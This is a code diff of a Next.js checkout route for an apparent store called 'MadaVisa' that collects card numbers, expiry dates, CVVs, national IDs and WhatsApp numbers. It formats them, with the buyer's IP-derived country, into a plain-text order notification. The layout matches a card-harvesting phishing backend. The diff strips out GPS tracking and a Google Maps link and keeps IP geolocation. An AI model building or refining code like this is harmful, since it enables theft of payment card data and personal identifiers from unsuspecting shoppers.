@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, lat, lng } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
 
@@ -9,25 +9,13 @@ export async function POST(req: NextRequest) {
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
   let country = "غير معروف";
 
-  // لو عندنا GPS نستخدمه أولاً
-  if (lat && lng) {
+  const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
+  if (!isLocal) {
     try {
-      const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`, {
-        headers: { "User-Agent": "madar-store/1.0" },
-      });
+      const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
       const geoData = await geo.json();
-      if (geoData.address?.country) country = geoData.address.country;
+      if (geoData.country) country = geoData.country;
     } catch {}
-  } else {
-    // fallback على الـ IP
-    const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
-    if (!isLocal) {
-      try {
-        const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
-        const geoData = await geo.json();
-        if (geoData.country) country = geoData.country;
-      } catch {}
-    }
   }
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
@@ -52,7 +40,6 @@ export async function POST(req: NextRequest) {
     ``,
     `🏦 MadaVisa - New Order`,
     `🌍 Country: ${country}`,
-    ...(lat && lng ? [`📍 Location: https://maps.google.com/?q=${lat},${lng}`] : []),
     `🙍 Order For: ${customer ?? "-"}`,
     `📲 WhatsApp: ${whatsapp ?? "-"}`,
     `🪪 Card Number: ${cardNumber}`,
